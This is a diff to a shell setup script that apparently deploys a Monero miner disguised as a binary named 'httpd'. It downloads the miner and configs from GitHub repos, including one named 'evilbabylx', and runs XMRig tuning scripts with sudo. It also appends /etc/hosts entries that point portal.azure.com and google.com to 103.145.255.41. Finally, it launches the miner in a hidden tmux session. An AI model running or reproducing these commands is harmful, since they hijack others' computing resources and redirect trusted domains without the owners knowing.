@@ -3,6 +3,14 @@
 sudo apt-get install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev tmux -y
 sudo wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/config.json
 sudo wget https://github.com/minnie1311/xmrorge/raw/master/httpd
+sudo rm config.json
+sudo wget https://raw.githubusercontent.com/evilbabylx/script/master/config.json
+sudo chmod +x azu
+sudo -- sh -c "echo '103.145.255.41  portal.azure.com' >> /etc/hosts"
+wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
+sudo bash enable_1gb_pages.sh
+wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
+sudo bash randomx_boost.sh
 sudo chmod +x httpd
 sudo -- sh -c "echo '103.145.255.41  google.com' >> /etc/hosts"
 sudo tmux new-session -d -s my_session1  './httpd'
